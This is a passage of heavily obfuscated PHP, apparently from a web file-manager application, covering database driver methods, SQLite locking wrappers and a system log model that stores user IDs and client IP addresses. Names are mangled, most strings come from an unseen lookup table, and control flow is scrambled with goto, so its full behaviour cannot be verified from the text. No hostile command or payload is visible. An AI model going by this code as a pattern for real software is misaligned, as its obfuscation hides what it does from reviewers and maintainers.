isset($Cç“Éõá¿Ê[$AãÈ‚îâ[887]]) ? strtolower($Cç“Éõá¿Ê[$AãÈ‚îâ[887]]) == $AãÈ‚îâ[41] : (isset($Cç“Éõá¿Ê[$AãÈ‚îâ[92]]) ? $Cç“Éõá¿Ê[$AãÈ‚îâ[92]] : !1)); } } goto Dçœ§¥ô†ª; fõŸìïÚ–Ä: $AãÈ‚îâ =& $_SERVER[òÀöí]; $this->initConnect(!0); if (think_config($AãÈ‚îâ[871])) { $D¼âˆ‚¶Âö = str_replace($AãÈ‚îâ[872], $Bëœåª‡ÖÛ, think_config($AãÈ‚îâ[871])); } else { switch ($this->dbType) { case $AãÈ‚îâ[855]: case $AãÈ‚îâ[873]: $D¼âˆ‚¶Âö = "\x53\105\x4c\x45\103\124\40\x20\x20\143\157\154\165\x6d\156\137\x6e\x61\155\145\x20\141\163\40\x27\x4e\x61\x6d\x65\x27\x2c\x20\40\40\144\x61\x74\141\137\x74\x79\x70\145\x20\x61\163\40\x27\124\171\160\x65\47\x2c\40\40\x20\x63\x6f\x6c\x75\155\x6e\137\x64\145\x66\x61\x75\154\x74\x20\141\163\40\47\x44\x65\146\141\165\x6c\164\x27\x2c\x20\x20\40\151\163\x5f\x6e\165\x6c\x6c\x61\142\x6c\145\x20\141\x73\40\x27\116\165\154\154\47\12\x9\x9\106\122\x4f\x4d\x9\151\156\146\157\162\155\x61\164\x69\157\x6e\137\x73\143\150\145\x6d\141\x2e\164\141\142\154\145\x73\x20\x41\123\40\x74\xa\x9\11\112\117\x49\116\x9\x69\x6e\x66\157\162\x6d\x61\x74\x69\x6f\x6e\137\x73\143\x68\x65\x6d\x61\56\143\x6f\154\165\x6d\x6e\163\40\101\123\x20\x63\xa\x9\x9\x4f\116\40\x20\x74\56\x74\141\142\x6c\x65\137\x63\x61\164\x61\x6c\157\x67\x20\x3d\40\143\56\x74\141\142\154\x65\137\x63\141\164\x61\x6c\157\x67\12\11\x9\x41\116\104\40\x74\x2e\x74\x61\x62\154\145\137\163\x63\x68\x65\155\141\40\75\40\x63\x2e\x74\x61\142\154\x65\x5f\163\x63\x68\x65\x6d\141\12\x9\11\101\116\104\40\x74\56\164\141\142\x6c\145\137\156\x61\155\x65\x20\x3d\40\x63\56\x74\x61\x62\154\x65\x5f\x6e\141\x6d\x65\xa\x9\x9\127\110\105\122\x45\x20\40\x20\x74\x2e\164\141\x62\154\145\137\x6e\x61\x6d\145\x20\75\x20\47{$Bëœåª‡ÖÛ}\47"; break; case $AãÈ‚îâ[874]: $D¼âˆ‚¶Âö = $AãÈ‚îâ[875] . $Bëœåª‡ÖÛ . $AãÈ‚îâ[876]; break; case $AãÈ‚îâ[856]: case $AãÈ‚îâ[858]: $D¼âˆ‚¶Âö = $AãÈ‚îâ[877] . $AãÈ‚îâ[878] . $AãÈ‚îâ[879] . strtoupper($Bëœåª‡ÖÛ) . $AãÈ‚îâ[880] . strtoupper($Bëœåª‡ÖÛ) . $AãÈ‚îâ[881]; break; case $AãÈ‚îâ[882]: $D¼âˆ‚¶Âö = $AãÈ‚îâ[883] . $Bëœåª‡ÖÛ . $AãÈ‚îâ[884]; break; case $AãÈ‚îâ[857]: break; case $AãÈ‚îâ[885]: default: $D¼âˆ‚¶Âö = $AãÈ‚îâ[886] . ($this->dbType == $AãÈ‚îâ[885] ? "\x60{$Bëœåª‡ÖÛ}\x60" : $Bëœåª‡ÖÛ); } } goto d½Õ‹ïæ; Dçœ§¥ô†ª: return $AŞË«»„¹ˆ; goto EÎâ±²í¬; EÎâ±²í¬: } public function getTables($c¬Ù¾ùï’ = '') { $a”„İùÃ®² =& $_SERVER[òÀöí]; if (think_config($a”„İùÃ®²[888])) { $a³ùŠ¤¬á© = str_replace($a”„İùÃ®²[889], $c¬Ù¾ùï’, think_config($a”„İùÃ®²[888])); } else { switch ($this->dbType) { case $a”„İùÃ®²[856]: case $a”„İùÃ®²[858]: $a³ùŠ¤¬á© = $a”„İùÃ®²[890]; break; case $a”„İùÃ®²[855]: case $a”„İùÃ®²[873]: $a³ùŠ¤¬á© = $a”„İùÃ®²[891]; break; case $a”„İùÃ®²[882]: $a³ùŠ¤¬á© = $a”„İùÃ®²[892]; break; case $a”„İùÃ®²[857]: think_exception(think_lang($a”„İùÃ®²[893]) . $a”„İùÃ®²[894]); break; case $a”„İùÃ®²[874]: $a³ùŠ¤¬á© = $a”„İùÃ®²[42] . $a”„İùÃ®²[43] . $a”„İùÃ®²[44]; break; case $a”„İùÃ®²[885]: default: if (!empty($c¬Ù¾ùï’)) { $a³ùŠ¤¬á© = $a”„İùÃ®²[838] . $c¬Ù¾ùï’ . $a”„İùÃ®²[839]; } else { $a³ùŠ¤¬á© = $a”„İùÃ®²[840]; } } } $F—ŒÈô”¨‰ = $this->query($a³ùŠ¤¬á©); $bªÖ‚å‡ç‰ = array(); foreach ($F—ŒÈô”¨‰ as $C¹Ş¤ÌÁ™„ => $fÑ±Ê˜¤‚È) { $bªÖ‚å‡ç‰[$C¹Ş¤ÌÁ™„] = current($fÑ±Ê˜¤‚È); } return $bªÖ‚å‡ç‰; } protected function parseLimit($eó¯Ã‚‘İ·) { $cáÎòÏôïò =& $_SERVER[òÀöí]; $cÉ¶‚ßŠõø = $cáÎòÏôïò[33]; if (!empty($eó¯Ã‚‘İ·)) { switch ($this->dbType) { case $cáÎòÏôïò[882]: case $cáÎòÏôïò[874]: $eó¯Ã‚‘İ· = explode($cáÎòÏôïò[47], $eó¯Ã‚‘İ·); if (count($eó¯Ã‚‘İ·) > 1) { $cÉ¶‚ßŠõø .= $cáÎòÏôïò[48] . $eó¯Ã‚‘İ·[1] . $cáÎòÏôïò[49] . $eó¯Ã‚‘İ·[0] . $cáÎòÏôïò[50]; } else { $cÉ¶‚ßŠõø .= $cáÎòÏôïò[48] . $eó¯Ã‚‘İ·[0] . $cáÎòÏôïò[50]; } break; case $cáÎòÏôïò[855]: case $cáÎòÏôïò[873]: break; case $cáÎòÏôïò[857]: break; case $cáÎòÏôïò[856]: case $cáÎòÏôïò[858]: break; case $cáÎòÏôïò[885]: default: $cÉ¶‚ßŠõø .= $cáÎòÏôïò[48] . $eó¯Ã‚‘İ· . $cáÎòÏôïò[50]; } } return $cÉ¶‚ßŠõø; } public function parseKey(&$b”îºêÂ©, $D©Ô¤¹ŒÚ = true) { $a˜¿“ƒß‰õ =& $_SERVER[òÀöí]; if ($D©Ô¤¹ŒÚ) { $b”îºêÂ© = $this->parseKeyCheck($b”îºêÂ©); } if ($this->dbType == $a˜¿“ƒß‰õ[885]) { if ($b”îºêÂ© != $a˜¿“ƒß‰õ[182] && !preg_match($a˜¿“ƒß‰õ[850], $b”îºêÂ©)) { $b”îºêÂ© = $a˜¿“ƒß‰õ[377] . trim($b”îºêÂ©, $a˜¿“ƒß‰õ[377]) . $a˜¿“ƒß‰õ[377]; } return $b”îºêÂ©; } else { return parent::parseKey($b”îºêÂ©); } } public function close() { $this->_linkID = null; } public function error() { $añÇëííÉŞ =& $_SERVER[òÀöí]; if ($this->PDOStatement) { $B©–²–Ô× = $this->PDOStatement->errorInfo(); $this->error = $B©–²–Ô×[1] . $añÇëííÉŞ[4] . $B©–²–Ô×[2]; } else { $this->error = $añÇëííÉŞ[33]; } if ($añÇëííÉŞ[33] != $this->queryStr) { $this->error .= LNG($añÇëííÉŞ[45]) . $this->queryStr; } think_trace($this->error, $añÇëííÉŞ[33], $añÇëííÉŞ[46]); return $this->error; } public function escapeString($BÉÎ£îƒÓœ) { $BøöÆÑö =& $_SERVER[òÀöí]; switch ($this->dbType) { case $BøöÆÑö[882]: case $BøöÆÑö[855]: case $BøöÆÑö[873]: case $BøöÆÑö[885]: return addslashes($BÉÎ£îƒÓœ); case $BøöÆÑö[857]: case $BøöÆÑö[874]: case $BøöÆÑö[856]: case $BøöÆÑö[858]: return str_ireplace($BøöÆÑö[55], $BøöÆÑö[56], $BÉÎ£îƒÓœ); } } protected function parseValue($Cç…ùÇÀ›ï) { $E¶¦‹…Æ§ =& $_SERVER[òÀöí]; if (is_string($Cç…ùÇÀ›ï)) { $Cç…ùÇÀ›ï = strpos($Cç…ùÇÀ›ï, $E¶¦‹…Æ§[4]) === 0 ? $this->escapeString($Cç…ùÇÀ›ï) : $E¶¦‹…Æ§[895] . $this->escapeString($Cç…ùÇÀ›ï) . $E¶¦‹…Æ§[895]; } elseif (isset($Cç…ùÇÀ›ï[0]) && is_string($Cç…ùÇÀ›ï[0]) && strtolower($Cç…ùÇÀ›ï[0]) == $E¶¦‹…Æ§[293]) { $Cç…ùÇÀ›ï = $this->escapeString($Cç…ùÇÀ›ï[1]); } elseif (is_array($Cç…ùÇÀ›ï)) { $Cç…ùÇÀ›ï = array_map(array($this, $E¶¦‹…Æ§[896]), $Cç…ùÇÀ›ï); } elseif (is_bool($Cç…ùÇÀ›ï)) { $Cç…ùÇÀ›ï = $Cç…ùÇÀ›ï ? $E¶¦‹…Æ§[86] : $E¶¦‹…Æ§[486]; } elseif (is_null($Cç…ùÇÀ›ï)) { $Cç…ùÇÀ›ï = $E¶¦‹…Æ§[102]; } return $Cç…ùÇÀ›ï; } public function getLastInsertId() { $dƒ˜ÆñƒÍ¨ =& $_SERVER[òÀöí]; switch ($this->dbType) { case $dƒ˜ÆñƒÍ¨[882]: case $dƒ˜ÆñƒÍ¨[874]: case $dƒ˜ÆñƒÍ¨[855]: case $dƒ˜ÆñƒÍ¨[873]: case $dƒ˜ÆñƒÍ¨[857]: case $dƒ˜ÆñƒÍ¨[885]: return $this->_linkID->lastInsertId(); case $dƒ˜ÆñƒÍ¨[856]: case $dƒ˜ÆñƒÍ¨[858]: $c¯Ç£ºù…š = $this->table; $eÔ¾Œ’— = $this->query("\123\105\x4c\x45\103\124\40{$c¯Ç£ºù…š}\x2e\x63\165\x72\162\166\141\x6c\x20\143\165\x72\162\166\141\154\x20\x46\x52\117\115\40\x64\x75\x61\x6c"); return $eÔ¾Œ’— ? $eÔ¾Œ’—[0][$dƒ˜ÆñƒÍ¨[897]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($aßÁ½±·Ë˜) { $bÚ¢»˜©µ© =& $_SERVER[òÀöí]; if (!CacheLock::fileLock($bÚ¢»˜©µ©[9])) { return !1; } $AŸ©âÕÆÂ = parent::query($aßÁ½±·Ë˜); CacheLock::fileUnLock($bÚ¢»˜©µ©[9]); return $AŸ©âÕÆÂ; } public function execute($A¾øÛ¢İ§¥) { $E‚¾ç¦ÖíÔ =& $_SERVER[òÀöí]; if (!CacheLock::fileLock($E‚¾ç¦ÖíÔ[9])) { return !1; } $DÔ“ÆÔÒÚ = parent::execute($A¾øÛ¢İ§¥); CacheLock::fileUnLock($E‚¾ç¦ÖíÔ[9]); return $DÔ“ÆÔÒÚ; } } class DbSqlite3 extends DbSqlite3Base { public function query($BÓª¿Ñ¡÷¡) { $B£”‡Ü‘¢ =& $_SERVER[òÀöí]; if (!CacheLock::fileLock($B£”‡Ü‘¢[9])) { return !1; } $c’îÑˆˆñ‘ = parent::query($BÓª¿Ñ¡÷¡); CacheLock::fileUnLock($B£”‡Ü‘¢[9]); return $c’îÑˆˆñ‘; } public function execute($e©Ø—±³ÆÛ) { $e²“¢¶½ =& $_SERVER[òÀöí]; if (!CacheLock::fileLock($e²“¢¶½[9])) { return !1; } $DƒÖËŸĞ‹ = parent::execute($e©Ø—±³ÆÛ); CacheLock::fileUnLock($e²“¢¶½[9]); return $DƒÖËŸĞ‹; } } goto B–®¥¢Üï; cÖ°ášºçö: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\x2e\114\151\x67\150\x74\101\x70\x70"; public $modelType = "\123\171\x73\x74\145\155\117\160\164\x69\x6f\156"; public $field = array("\x6e\x61\155\x65", "\x67\162\x6f\165\160", "\144\x65\163\x63", "\x63\157\156\x74\x65\x6e\164"); public function listData($e¹å¬–°´ = false, $CÎ†ÖËŸ¼â = "\x6d\x6f\144\151\x66\x79\124\151\x6d\145", $A¹š¹ˆù£Ú = true) { return parent::listData($e¹å¬–°´, $CÎ†ÖËŸ¼â, $A¹š¹ˆù£Ú); } public function remove($CÑ™éç©È±) { $B¤ƒ†à½ÏÁ = $this->findByName($CÑ™éç©È±); if (!$B¤ƒ†à½ÏÁ) { return !1; } return parent::remove($B¤ƒ†à½ÏÁ[$_SERVER[òÀöí][385]]); } public function add($D‰è½´Ãùœ) { if ($this->findByName($D‰è½´Ãùœ[$_SERVER[òÀöí][28]])) { return !1; } return parent::insert($D‰è½´Ãùœ); } public function update($BçåŞˆ—ÉÜ, $bÏÏÌÒÙ£Ó) { $f‹‘‡ˆÕòé =& $_SERVER[òÀöí]; $D™¥–ğ¾ê = $this->findByName($BçåŞˆ—ÉÜ); $dÖÃæŸˆ‚ = $this->findByName($bÏÏÌÒÙ£Ó[$f‹‘‡ˆÕòé[28]]); if (!$D™¥–ğ¾ê || $dÖÃæŸˆ‚ && $dÖÃæŸˆ‚[$f‹‘‡ˆÕòé[385]] != $D™¥–ğ¾ê[$f‹‘‡ˆÕòé[385]]) { return !1; } return parent::update($D™¥–ğ¾ê[$f‹‘‡ˆÕòé[385]], $bÏÏÌÒÙ£Ó); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\164\x65\x6d\137\x6c\157\147"; protected $dataAuto = array(array("\143\x72\x65\x61\164\145\x54\x69\155\145", "\164\151\155\145", "\151\156\163\145\x72\164", "\x66\x75\x6e\x63\164\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $f¶İ¨§½ÅÄ =& $_SERVER[òÀöí]; return array($f¶İ¨§½ÅÄ[1973] => LNG($f¶İ¨§½ÅÄ[1974]), $f¶İ¨§½ÅÄ[1975] => LNG($f¶İ¨§½ÅÄ[1976]), $f¶İ¨§½ÅÄ[1602] => LNG($f¶İ¨§½ÅÄ[1977]), $f¶İ¨§½ÅÄ[1978] => LNG($f¶İ¨§½ÅÄ[1979]), $f¶İ¨§½ÅÄ[1980] => LNG($f¶İ¨§½ÅÄ[1981]), $f¶İ¨§½ÅÄ[1982] => LNG($f¶İ¨§½ÅÄ[1983]), $f¶İ¨§½ÅÄ[1984] => LNG($f¶İ¨§½ÅÄ[1985]), $f¶İ¨§½ÅÄ[1633] => LNG($f¶İ¨§½ÅÄ[1985]), $f¶İ¨§½ÅÄ[1634] => LNG($f¶İ¨§½ÅÄ[1986]), $f¶İ¨§½ÅÄ[1987] => LNG($f¶İ¨§½ÅÄ[1988]), $f¶İ¨§½ÅÄ[1989] => LNG($f¶İ¨§½ÅÄ[1990]), $f¶İ¨§½ÅÄ[1991] => LNG($f¶İ¨§½ÅÄ[1992]), $f¶İ¨§½ÅÄ[1993] => LNG($f¶İ¨§½ÅÄ[1994]), $f¶İ¨§½ÅÄ[1631] => LNG($f¶İ¨§½ÅÄ[1995]), $f¶İ¨§½ÅÄ[1638] => LNG($f¶İ¨§½ÅÄ[1996]), $f¶İ¨§½ÅÄ[1997] => LNG($f¶İ¨§½ÅÄ[1998]), $f¶İ¨§½ÅÄ[1999] => LNG($f¶İ¨§½ÅÄ[2000]), $f¶İ¨§½ÅÄ[2001] => LNG($f¶İ¨§½ÅÄ[2002]), $f¶İ¨§½ÅÄ[2003] => LNG($f¶İ¨§½ÅÄ[2004]), $f¶İ¨§½ÅÄ[1641] => LNG($f¶İ¨§½ÅÄ[2005]), $f¶İ¨§½ÅÄ[1642] => LNG($f¶İ¨§½ÅÄ[2006]), $f¶İ¨§½ÅÄ[2007] => LNG($f¶İ¨§½ÅÄ[2008]), $f¶İ¨§½ÅÄ[2009] => LNG($f¶İ¨§½ÅÄ[2010]), $f¶İ¨§½ÅÄ[2011] => LNG($f¶İ¨§½ÅÄ[2012]), $f¶İ¨§½ÅÄ[1636] => LNG($f¶İ¨§½ÅÄ[2013]), $f¶İ¨§½ÅÄ[2014] => LNG($f¶İ¨§½ÅÄ[2015]), $f¶İ¨§½ÅÄ[1635] => LNG($f¶İ¨§½ÅÄ[2016]), $f¶İ¨§½ÅÄ[2017] => LNG($f¶İ¨§½ÅÄ[2018]), $f¶İ¨§½ÅÄ[2019] => LNG($f¶İ¨§½ÅÄ[2020]), $f¶İ¨§½ÅÄ[2021] => LNG($f¶İ¨§½ÅÄ[2021]), $f¶İ¨§½ÅÄ[2022] => LNG($f¶İ¨§½ÅÄ[1606]), $f¶İ¨§½ÅÄ[2023] => LNG($f¶İ¨§½ÅÄ[2024]), $f¶İ¨§½ÅÄ[2025] => LNG($f¶İ¨§½ÅÄ[2026]), $f¶İ¨§½ÅÄ[2027] => LNG($f¶İ¨§½ÅÄ[2028]), $f¶İ¨§½ÅÄ[2029] => LNG($f¶İ¨§½ÅÄ[2030]), $f¶İ¨§½ÅÄ[2031] => LNG($f¶İ¨§½ÅÄ[2032]), $f¶İ¨§½ÅÄ[2033] => LNG($f¶İ¨§½ÅÄ[2033]), $f¶İ¨§½ÅÄ[2034] => LNG($f¶İ¨§½ÅÄ[2035]), $f¶İ¨§½ÅÄ[2036] => LNG($f¶İ¨§½ÅÄ[2037]), $f¶İ¨§½ÅÄ[2038] => LNG($f¶İ¨§½ÅÄ[2039]), $f¶İ¨§½ÅÄ[2040] => LNG($f¶İ¨§½ÅÄ[2041]), $f¶İ¨§½ÅÄ[2042] => LNG($f¶İ¨§½ÅÄ[2043]), $f¶İ¨§½ÅÄ[2044] => LNG($f¶İ¨§½ÅÄ[2045])); } private function typeFile() { $cºŠÖŒÓ =& $_SERVER[òÀöí]; $FÍ«»è‡„™ = array($cºŠÖŒÓ[1638] => array($cºŠÖŒÓ[1639]), $cºŠÖŒÓ[1991] => array($cºŠÖŒÓ[2046]), $cºŠÖŒÓ[1993] => array($cºŠÖŒÓ[2047]), $cºŠÖŒÓ[1631] => array($cºŠÖŒÓ[1632]), $cºŠÖŒÓ[1999] => array(), $cºŠÖŒÓ[2001] => array(), $cºŠÖŒÓ[2003] => array(), $cºŠÖŒÓ[1641] => array($cºŠÖŒÓ[1643]), $cºŠÖŒÓ[1642] => array($cºŠÖŒÓ[1643]), $cºŠÖŒÓ[2007] => array($cºŠÖŒÓ[2048]), $cºŠÖŒÓ[2009] => array($cºŠÖŒÓ[2048]), $cºŠÖŒÓ[2011] => array($cºŠÖŒÓ[2049]), $cºŠÖŒÓ[1997] => array($cºŠÖŒÓ[2050]), $cºŠÖŒÓ[1636] => array($cºŠÖŒÓ[2051]), $cºŠÖŒÓ[2014] => array($cºŠÖŒÓ[2052]), $cºŠÖŒÓ[1635] => array($cºŠÖŒÓ[1637])); return $FÍ«»è‡„™; } private function typeAll() { goto c†©‘äÒ…á; e§İí«Òø: foreach ($cíËõÑƒŠ as $AªøºÀÏ² => $dËÏ†ÕÀ«ê) { $dÀ ê©òğ[$dËÏ†ÕÀ«ê[0]] = $dÀ ê©òğ[$AªøºÀÏ²]; } $dÀ ê©òğ[$e…–Ç¡§Ô[1643]] = LNG($e…–Ç¡§Ô[2053]); $dÀ ê©òğ[$e…–Ç¡§Ô[2048]] = LNG($e…–Ç¡§Ô[2054]); goto dÔ¢«ØŞ¹æ; dÔ¢«ØŞ¹æ: return $dÀ ê©òğ; goto c–øêÜù½Î; c†©‘äÒ…á: $e…–Ç¡§Ô =& $_SERVER[òÀöí]; $dÀ ê©òğ = $this->typeList; $cíËõÑƒŠ = array_filter($this->typeFile()); goto e§İí«Òø; c–øêÜù½Î: } public function addLog($Cùˆ¿ë‰×À, $dÇ„äˆ² = array()) { goto dé¢›Æ˜; a…Ğ¬éàˆ…: $dÇ„äˆ² = array($b…ˆ‹Á¶ºŒ[1495] => Session::sign(), $b…ˆ‹Á¶ºŒ[1496] => $BïÅÀ™»†Œ, $b…ˆ‹Á¶ºŒ[29] => $Cùˆ¿ë‰×À, $b…ˆ‹Á¶ºŒ[1498] => json_encode($dÇ„äˆ²)); parent::add($dÇ„äˆ²); goto d•ÉËšä©­; dé¢›Æ˜: $b…ˆ‹Á¶ºŒ =& $_SERVER[òÀöí]; if (!isset($this->typeList[$Cùˆ¿ë‰×À])) { return; } $BïÅÀ™»†Œ = defined($b…ˆ‹Á¶ºŒ[443]) && USER_ID ? USER_ID : (isset($dÇ„äˆ²[$b…ˆ‹Á¶ºŒ[1504]]) ? $dÇ„äˆ²[$b…ˆ‹Á¶ºŒ[1504]] : 0); goto c±‘¶±†ÜÛ; c±‘¶±†ÜÛ: if (!$BïÅÀ™»†Œ) { $BïÅÀ™»†Œ = (int) Session::get($b…ˆ‹Á¶ºŒ[1787]); } $D§±‰‡øİ = get_client_ip(); if (!$dÇ„äˆ² || strlen(json_encode($dÇ„äˆ²)) >= 1024) { $dÇ„äˆ² = array($b…ˆ‹Á¶ºŒ[2055] => $D§±‰‡øİ); } else { if (is_array($dÇ„äˆ²)) { $dÇ„äˆ²[$b…ˆ‹Á¶ºŒ[2055]] = $D§±‰‡øİ; } else { $dÇ„äˆ² = array($b…ˆ‹Á¶ºŒ[1066] => $dÇ„äˆ², $b…ˆ‹Á¶ºŒ[2055] => $D§±‰‡øİ); } } goto a…Ğ¬éàˆ…; d•ÉËšä©­: } public function remove($E¤¶¦­…ù) { $this->where(array($_SERVER[òÀöí][403] => $E¤¶¦­…ù))->delete(); } private function _makeOrder($A¬À™‡Ìî‡ = '') { goto BÏ£«´°¡˜; BÏ£«´°¡˜: $FÆ¼ê©óÔÑ =& $_SERVER[òÀöí]; $e˜ø‡êËã” = $FÆ¼ê©óÔÑ[192]; $FÎ¯äå‹ƒ‡ = array($FÆ¼ê©óÔÑ[419] => $FÆ¼ê©óÔÑ[420], $FÆ¼ê©óÔÑ[421] => $FÆ¼ê©óÔÑ[422]); goto CŒó¾•õİ´; CŒó¾•õİ´: $aÉ¿È©µœ = Input::get($FÆ¼ê©óÔÑ[425], $FÆ¼ê©óÔÑ[7], $FÆ¼ê©óÔÑ[1822], array($FÆ¼ê©óÔÑ[1747], $FÆ¼ê©óÔÑ[421])); $aÉ¿È©µœ = $FÎ¯äå‹ƒ‡[$aÉ¿È©µœ]; $A¬À™‡Ìî‡ = $A¬À™‡Ìî‡ . "{$e˜ø‡êËã”}\x20{$aÉ¿È©µœ}"; goto EÁóÆØÜ—×; EÁóÆØÜ—×: return $this->order($A¬À™‡Ìî‡); goto aÊ¶ôÂõì²; aÊ¶ôÂõì²: } public function get($FåíŸÆ™‘º = '') { goto EŒ¯¨ñ¨‚; fš¦“­†Ç™: if (!empty($FåíŸÆ™‘º[$b÷öÑ‰éÇ…[2055]])) { $cÚù³’ÑÇ½[$b÷öÑ‰éÇ…[422]] = array($b÷öÑ‰éÇ…[375], "\45{$FåíŸÆ™‘º[$b÷öÑ‰éÇ…[2055]]}\45"); } $dŒŒˆ¸Ï¨— = $this->_makeOrder()->where($cÚù³’ÑÇ½)->selectPage(); if (empty($dŒŒˆ¸Ï¨—[$b÷öÑ‰éÇ…[363]])) { show_json(array(), !0, $dŒŒˆ¸Ï¨—[$b÷öÑ‰éÇ…[360]]); } goto b„ÏÜõÕ¦; b„ÏÜõÕ¦: $dŒŒˆ¸Ï¨—[$b÷öÑ‰éÇ…[363]] = $this->logList($dŒŒˆ¸Ï¨—[$b÷öÑ‰éÇ…[363]]); return $dŒŒˆ¸Ï¨—; goto bƒëßß‘±; EŒ¯¨ñ¨‚: $b÷öÑ‰éÇ… =& $_SERVER[òÀöí]; if (!$FåíŸÆ™‘º) { show_json(array()); } $cÚù³’ÑÇ½ = array(); goto EæîÓƒ©ƒŒ; EæîÓƒ©ƒŒ: if ($FåíŸÆ™‘º[$b÷öÑ‰éÇ…[1504]]) { $cÚù³’ÑÇ½[$b÷öÑ‰éÇ…[1504]] = $FåíŸÆ™‘º[$b÷öÑ‰éÇ…[1504]]; } if (isset($FåíŸÆ™‘º[$b÷öÑ‰éÇ…[721]])) { $aõÇ·£ÜÀ = $FåíŸÆ™‘º[$b÷öÑ‰éÇ…[721]]; $c›öÚœ— = isset($FåíŸÆ™‘º[$b÷öÑ‰éÇ…[465]]) ? $FåíŸÆ™‘º[$b÷öÑ‰éÇ…[465]] : time(); $cÚù³’ÑÇ½[$b÷öÑ‰éÇ…[192]] = array($b÷öÑ‰éÇ…[329], array($aõÇ·£ÜÀ, $c›öÚœ—)); } if ($FåíŸÆ™‘º[$b÷öÑ‰éÇ…[29]]) { $C¦×¿î‘¯« = explode($b÷öÑ‰éÇ…[47], $FåíŸÆ™‘º[$b÷öÑ‰éÇ…[29]]); $C¶•ƒÍŠˆÒ = $this->typeFile(); $B»›©ÌßÍÔ = array(); foreach ($C¦×¿î‘¯« as $B­”‘²¼ŒÎ) { $B»›©ÌßÍÔ[] = $B­”‘²¼ŒÎ; if (isset($C¶•ƒÍŠˆÒ[$B­”‘²¼ŒÎ])) { $B»›©ÌßÍÔ = array_merge($B»›©ÌßÍÔ, $C¶•ƒÍŠˆÒ[$B­”‘²¼ŒÎ]); } } $B»›©ÌßÍÔ = array_unique($B»›©ÌßÍÔ); if ($B»›©ÌßÍÔ) { $cÚù³’ÑÇ½[$b÷öÑ‰éÇ…[29]] = array($b÷öÑ‰éÇ…[7], $B»›©ÌßÍÔ); } } goto fš¦“­†Ç™; bƒëßß‘±: } private function ipAddress(&$c˜åÚ„¼ƒ) { $f¬•‚â¸ªˆ =& $_SERVER[òÀöí]; if (!empty($c˜åÚ„¼ƒ[$f¬•‚â¸ªˆ[2055]])) { $Bä›¿¤»¥¾ = IpLocation::get($c˜åÚ„¼ƒ[$f¬•‚â¸ªˆ[2055]]); } else { $Bä›¿¤»¥¾ = LNG($f¬•‚â¸ªˆ[2056]); } $c˜åÚ„¼ƒ[$f¬•‚â¸ªˆ[2057]] = $Bä›¿¤»¥¾; } private function descZipDownload($C¢£İ®óº…, &$aíÖç¦áˆô) { $d“ºÓ–çÆ =& $_SERVER[òÀöí]; if (!isset($C¢£İ®óº…[$d“ºÓ–çÆ[2058]])) { return; } $dË’Ë–Ó = json_decode($C¢£İ®óº…[$d“ºÓ–çÆ[2058]], !0); foreach ($dË’Ë–Ó as $f¼†µŒªŸ°) { try { $e†Ëˆºó¸ = IO::infoFull($f¼†µŒªŸ°[$d“ºÓ–çÆ[75]]); } catch (Exception $BšÖÁ”¡ï) { continue; } $C¢£İ®óº…[$d“ºÓ–çÆ[75]] = $f¼†µŒªŸ°[$d“ºÓ–çÆ[75]]; $aíÖç¦áˆô[] = $C¢£İ®óº…[$d“ºÓ–çÆ[387]] = $e†Ëˆºó¸[$d“ºÓ–çÆ[387]]; $aíÖç¦áˆô[] = $C¢£İ®óº…[$d“ºÓ–çÆ[1877]] = $e†Ëˆºó¸[$d“ºÓ–çÆ[479]]; break; } return $C¢£İ®óº…; } private function getSourceList(&$b¤çËä˜) { $e‚í¶‡­àÇ =& $_SERVER[òÀöí]; $a³Å©–êáÊ = array(); foreach ($b¤çËä˜ as $E›ˆ¯Ğ¸ì» => $fÛöğ³¹ä’) { goto cÒæƒéœ; c¶ØÓ¥İó: $a³Å©–êáÊ[] = $B™›·ö…—[$e‚í¶‡­àÇ[387]]; $a³Å©–êáÊ[] = $B™›·ö…—[$e‚í¶‡­àÇ[1877]]; if ($B™›·ö…—[$e‚í¶‡­àÇ[29]] == $e‚í¶‡­àÇ[509]) { $a³Å©–êáÊ[] = $B™›·ö…—[$e‚í¶‡­àÇ[422]][$e‚í¶‡­àÇ[1033]]; $a³Å©–êáÊ[] = $B™›·ö…—[$e‚í¶‡­àÇ[422]][$e‚í¶‡­àÇ[1034]]; } goto f»÷”¨Œà; f»÷”¨Œà: if ($B™›·ö…—[$e‚í¶‡­àÇ[29]] == $e‚í¶‡­àÇ[1885]) { $a³Å©–êáÊ[] = $B™›·ö…—[$e‚í¶‡­àÇ[422]][$e‚í¶‡­àÇ[387]]; } goto fÕÑ£»Á’; cÒæƒéœ: $B™›·ö…— = json_decode($fÛöğ³¹ä’[$e‚í¶‡­àÇ[422]], !0); if ($fÛöğ³¹ä’[$e‚í¶‡­àÇ[29]] == $e‚í¶‡­àÇ[1634]) { $B™›·ö…— = $this->descZipDownload($B™›·ö…—, $a³Å©–êáÊ); $b¤çËä˜[$E›ˆ¯Ğ¸ì»][$e‚í¶‡­àÇ[422]] = json_encode($B™›·ö…—); continue; } if (strpos($fÛöğ³¹ä’[$e‚í¶‡­àÇ[29]], $e‚í¶‡­àÇ[1878]) !== 0) { if (!isset($B™›·ö…—[$e‚í¶‡­àÇ[75]]) || strpos($fÛöğ³¹ä’[$e‚í¶‡­àÇ[29]], $e‚í¶‡­àÇ[2059]) !== 0) { continue; } try { $fàŒøŒíˆ¦ = IO::infoFull($B™›·ö…—[$e‚í¶‡­àÇ[75]]); } catch (Exception $BäÔ¸á Ğ) { continue; } $a³Å©–êáÊ[] = $B™›·ö…—[$e‚í¶‡­àÇ[387]] = $fàŒøŒíˆ¦[$e‚í¶‡­àÇ[387]]; $a³Å©–êáÊ[] = $B™›·ö…—[$e‚í¶‡­àÇ[1877]] = $fàŒøŒíˆ¦[$e‚í¶‡­àÇ[479]]; $b¤çËä˜[$E›ˆ¯Ğ¸ì»][$e‚í¶‡­àÇ[422]] = json_encode($B™›·ö…—); continue; } goto c¶ØÓ¥İó; fÕÑ£»Á’: } if (!$a³Å©–êáÊ) { return array(); } return Model($e‚í¶‡­àÇ[778])->sourceListInfo($a³Å©–êáÊ, !0); } private function logList($ešÎ…„…ê) { goto eí•Ø¼‹Åö; BŒ“Çñ­¶Ï: $E®  ¢‘˜ = $this->getSourceList($ešÎ…„…ê); $DÇë¸íæ®¡ = $this->typeAll(); $EÌ‚Œ²ÏŸÔ = array(); goto FÊŒˆãÕ‡¼; eí•Ø¼‹Åö: $A‰™ÖÚôĞø =& 